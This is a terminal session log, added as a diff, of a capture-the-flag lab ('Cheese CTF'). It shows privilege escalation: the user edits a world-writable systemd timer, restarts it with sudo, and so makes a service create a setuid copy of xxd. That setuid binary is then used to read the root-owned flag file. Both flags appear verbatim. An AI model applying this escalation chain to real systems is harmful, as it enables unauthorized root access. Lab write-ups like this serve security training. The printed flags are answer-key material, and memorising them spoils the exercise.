@@ -1,0 +1,155 @@
+Script started on 2025-01-22 20:01:58+03:00 [COMMAND="ssh -i h471x.key comte@cheese.ctf.thm" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-174-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 22 Jan 2025 05:02:00 PM UTC
+
+  System load:  0.0                Processes:             144
+  Usage of /:   31.4% of 18.53GB   Users logged in:       0
+  Memory usage: 9%                 IPv4 address for ens5: 10.10.132.144
+  Swap usage:   0%
+
+
+ * Introducing Expanded Security Maintenance for Applications.
+   Receive updates to over 25,000 software packages with your
+   Ubuntu Pro subscription. Free for personal use.
+
+     https://ubuntu.com/pro
+
+Expanded Security Maintenance for Applications is not enabled.
+
+47 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Thu Apr  4 17:26:03 2024 from 192.168.0.112
+]0;comte@cheesectf: ~[01;32mcomte@cheesectf[00m:[01;34m~[00m$ ls
+[0m[01;34msnap[0m  user.txt
+]0;comte@cheesectf: ~[01;32mcomte@cheesectf[00m:[01;34m~[00m$ cat user.txt
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠉⠛⠻⢶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠟⠁⣠⣴⣶⣶⣤⡀⠈⠉⠛⠿⢶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⠃⠀⢰⣿⠁⠀⠀⢹⡷⠀⠀⠀⠀⠀⠈⠙⠻⠷⣶⣤⣀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠋⠀⠀⠀⠈⠻⠷⠶⠾⠟⠁⠀⠀⣀⣀⡀⠀⠀⠀⠀⠀⠉⠛⠻⢶⣦⣄⡀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⣼⠟⠛⢿⡆⠀⠀⠀⠀⠀⣀⣤⣶⡿⠟⢿⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠋⠀⠀⣴⡿⠛⠛⠛⠛⣿⡄⠀⠀⠀⠀⠻⣶⣶⣾⠇⢀⣀⣤⣶⠿⠛⠉⠀⠀⠀⢸⡇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⢿⣦⡀⠀⠀⠀⣹⡇⠀⠀⠀⠀⠀⣀⣤⣶⡾⠟⠋⠁⠀⠀⠀⠀⠀⣠⣴⠾⠇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠁⠀⠀⠀⠀⠀⠀⠙⠻⠿⠶⠾⠟⠁⢀⣀⣤⡶⠿⠛⠉⠀⣠⣶⠿⠟⠿⣶⡄⠀⠀⣿⡇⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠟⢁⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠾⠟⠋⠁⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⣼⡇⠀⠀⠙⢷⣤⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⣾⡏⢻⣷⠀⠀⠀⢀⣠⣴⡶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣷⣤⣤⣴⡟⠀⠀⠀⠀⠀⢻⡇
+⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠙⠛⢛⣋⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢸⡇
+⠀⠀⠀⠀⣠⣾⠟⠁⠀⢀⣀⣤⣤⡶⠾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣤⣤⡀⠀⠀⠀⠀⠀⢸⡇
+⠀⠀⣠⣾⣿⣥⣶⠾⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⠶⣶⣤⣀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⠀⠈⠉⢻⣆⠀⠀⠀⠀⢸⡇
+⠀⢸⣿⠛⠉⠁⠀⢀⣠⣴⣶⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⠋⠀⠀⠀⠉⠻⣷⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⢸⡇
+⠀⢸⣿⠀⠀⠀⣴⡟⠋⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⢰⣿⠁⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⡇
+⠀⢸⡇⠀⠀⠀⢿⡆⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠙⢿⣦⣄⣀⣀⣠⣤⡾⠋⠀⠀⠀⠀⢸⡇
+⠀⢸⡇⠀⠀⠀⠘⣿⣄⣀⣠⣴⡿⠁⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⣀⣤⣴⠿⠃
+⠀⠸⣷⡄⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⡶⠟⠋⠉⠀⠀⠀
+⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢨⣿⠀⠀⠀⠀⠀⠀⣼⡟⠁⠀⠀⠀⠹⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢠⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣤⣤⣤⣴⡿⠃⠀⠀⣀⣤⣶⠾⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣀⣠⣴⡾⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⣿⡇⠀⠀⠀⠀⣀⣤⣴⠾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢻⣧⣤⣴⠾⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠘⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+
+THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}
+]0;comte@cheesectf: ~[01;32mcomte@cheesectf[00m:[01;34m~[00m$ sudo -l
+User comte may run the following commands on cheesectf:
+    (ALL) NOPASSWD: /bin/systemctl daemon-reload
+    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
+    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
+    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
+]0;comte@cheesectf: ~[01;32mcomte@cheesectf[00m:[01;34m~[00m$ cd /etc/systemd
+]0;comte@cheesectf: /etc/systemd[01;32mcomte@cheesectf[00m:[01;34m/etc/systemd[00m$ ls
+journald.conf  [0m[01;34mnetwork[0m        pstore.conf    sleep.conf  system.conf     [01;34muser[0m
+logind.conf    networkd.conf  resolved.conf  [01;34msystem[0m      timesyncd.conf  user.conf
+]0;comte@cheesectf: /etc/systemd[01;32mcomte@cheesectf[00m:[01;34m/etc/systemd[00m$ cd system
+]0;comte@cheesectf: /etc/systemd/system[01;32mcomte@cheesectf[00m:[01;34m/etc/systemd/system[00m$ ls
+[0m[01;34mcloud-final.service.wants[0m                   [01;34mmdmonitor.service.wants[0m         snap.lxd.activate.service
+[01;34mcloud-init.target.wants[0m                     [01;36mmultipath-tools.service[0m         snap.lxd.daemon.service
+[01;36mdbus-org.freedesktop.ModemManager1.service[0m  [01;34mmulti-user.target.wants[0m         snap.lxd.daemon.unix.socket
+[01;36mdbus-org.freedesktop.resolve1.service[0m       [01;36mmysqld.service[0m                  snap-snapd-20092.mount
+[01;36mdbus-org.freedesktop.thermald.service[0m       [01;36mmysql.service[0m                   snap-snapd-21184.mount
+[01;36mdbus-org.freedesktop.timesync1.service[0m      [01;34mnetwork-online.target.wants[0m     [01;34msockets.target.wants[0m
+[01;34mdefault.target.wants[0m                        [01;34mopen-vm-tools.service.requires[0m  [01;34msshd-keygen@.service.d[0m
+[01;34memergency.target.wants[0m                      [01;34mpaths.target.wants[0m              [01;36msshd.service[0m
+exploit.service                             [01;34mrescue.target.wants[0m             [01;34msysinit.target.wants[0m
+[01;32mexploit.timer[0m                               [01;34msleep.target.wants[0m              [01;36msyslog.service[0m
+[01;34mfinal.target.wants[0m                          snap-core20-2015.mount          [01;34mtimers.target.wants[0m
+[01;34mgetty.target.wants[0m                          snap-core20-2182.mount          twist.service
+[01;34mgraphical.target.wants[0m                      [01;34msnapd.mounts.target.wants[0m       [01;36mvmtoolsd.service[0m
+[01;36miscsi.service[0m                               snap-lxd-24061.mount
+]0;comte@cheesectf: /etc/systemd/system[01;32mcomte@cheesectf[00m:[01;34m/etc/systemd/system[00m$ cat exploit.service
+[Unit]
+Description=Exploit Service
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
+]0;comte@cheesectf: /etc/systemd/system[01;32mcomte@cheesectf[00m:[01;34m/etc/systemd/system[00m$ systemctl status exploit.timer
+[?1h=● exploit.timer - Exploit Timer[m
+     Loaded: [0;1;31mbad-setting[0m (Reason: Unit exploit.timer has a bad unit file setting.)[m
+     Active: inactive (dead)[m
+    Trigger: n/a[m
+   Triggers: ● exploit.service[m
+[K[?1l>]0;comte@cheesectf: /etc/systemd/system[01;32mcomte@cheesectf[00m:[01;34m/etc/systemd/system[00m$ cat exploit.timer
+[Unit]
+Description=Exploit Timer
+
+[Timer]
+OnBootSec=
+
+[Install]
+WantedBy=timers.target
+]0;comte@cheesectf: /etc/systemd/system[01;32mcomte@cheesectf[00m:[01;34m/etc/systemd/system[00m$ rm exploit.timer
+rm: cannot remove 'exploit.timer': Permission denied
+]0;comte@cheesectf: /etc/systemd/system[01;32mcomte@cheesectf[00m:[01;34m/etc/systemd/system[00m$ ls -l exploit.timer
+-rwxrwxrwx 1 root root 87 Mar 29  2024 [0m[01;32mexploit.timer[0m
+]0;comte@cheesectf: /etc/systemd/system[01;32mcomte@cheesectf[00m:[01;34m/etc/systemd/system[00m$ a[Knano exploit.timer
+[?2004h[?1049h[22;0;0t[1;27r(B[m[4l[?7h[39;49m[?1h=[?1h=[?25l[39;49m(B[m[H[2J[25;36H(B[0;7m[ Directory '.' is not writable ](B[m[H(B[0;7m  GNU nano 4.8                                 exploit.timer                                            [1;103H(B[m[26d(B[0;7m^G(B[m Get Help   (B[0;7m^O(B[m Write Out  (B[0;7m^W(B[m Where Is   (B[0;7m^K(B[m Cut Text   (B[0;7m^J(B[m Justify    (B[0;7m^C(B[m Cur Pos    (B[0;7mM-U(B[m Undo[27d(B[0;7m^X(B[m Exit[15G(B[0;7m^R(B[m Read File  (B[0;7m^\(B[m Replace    (B[0;7m^U(B[m Paste Text (B[0;7m^T(B[m To Spell   (B[0;7m^_(B[m Go To Line (B[0;7mM-E(B[m Redo[25d[2d(B[0;1m[32m[Unit][3d[39m(B[mDescription=Exploit Timer[5d(B[0;1m[32m[Timer][6d[39m(B[mOnBootSec=[8d(B[0;1m[32m[Install][9d[39m(B[mWantedBy=timers.target[2d[?12l[?25h[?25l[3d[?12l[?25h[?25l[4d[?12l[?25h[?25l[5d[?12l[?25h[?25l[6d[?12l[?25h[?25lO[?12l[?25h[?25ln[?12l[?25h[?25lB[?12l[?25h[?25lo[?12l[?25h[?25lo[?12l[?25h[?25lt[?12l[?25h[?25lS[?12l[?25h[?25le[?12l[?25h[?25lc[?12l[?25h[?25l=[?12l[?25h[?25l[7d[?12l[?25h[?25l[1;95H(B[0;7mModified(B[m[7;9H[?12l[?25h[?25l[?12l[?25h[?25l[6;11H[?12l[?25h[?25l[?12l[?25h[?25l=[?12l[?25h[?25l5[?12l[?25h[?25ls[?12l[?25h[?25l[25;45H[1K (B[0;7m[ Writing... ](B[m[K[1;95H(B[0;7m        (B[m[25;44H(B[0;7m[ Wrote 8 lines ](B[m[6;13H[?12l[?25h[?25l[25d[J[27d[?12l[?25h[27;1H[?1049l[23;0;0t[?1l>[?2004l]0;comte@cheesectf: /etc/systemd/system[01;32mcomte@cheesectf[00m:[01;34m/etc/systemd/system[00m$ cat exploit.timer
+[Unit]
+Description=Exploit Timer
+
+[Timer]
+OnBootSec=5s
+	
+[Install]
+WantedBy=timers.target
+]0;comte@cheesectf: /etc/systemd/system[01;32mcomte@cheesectf[00m:[01;34m/etc/systemd/system[00m$ sud[K[K[Ksudo -l
+User comte may run the following commands on cheesectf:
+    (ALL) NOPASSWD: /bin/systemctl daemon-reload
+    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
+    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
+    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
+]0;comte@cheesectf: /etc/systemd/system[01;32mcomte@cheesectf[00m:[01;34m/etc/systemd/system[00m$ sudo /bin/systemctl daemon-reload
+]0;comte@cheesectf: /etc/systemd/system[01;32mcomte@cheesectf[00m:[01;34m/etc/systemd/system[00m$ sudo /bin/systemctl restart exploit.timer
+]0;comte@cheesectf: /etc/systemd/system[01;32mcomte@cheesectf[00m:[01;34m/etc/systemd/system[00m$ cd /opt
+]0;comte@cheesectf: /opt[01;32mcomte@cheesectf[00m:[01;34m/opt[00m$ ls
+[0m[37;41mxxd[0m
+]0;comte@cheesectf: /opt[01;32mcomte@cheesectf[00m:[01;34m/opt[00m$ ./xxd "root[K[K[K[K/root/root.txt" | xxd -r
+      _                           _       _ _  __
+  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
+ / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
+| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
+ \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|
+
+
+THM{dca75486094810807faf4b7b0a929b11e5e0167c}
+]0;comte@cheesectf: /opt[01;32mcomte@cheesectf[00m:[01;34m/opt[00m$ exit
+logout
+Connection to cheese.ctf.thm closed.
+
+Script done on 2025-01-22 20:13:07+03:00 [COMMAND_EXIT_CODE="0"]
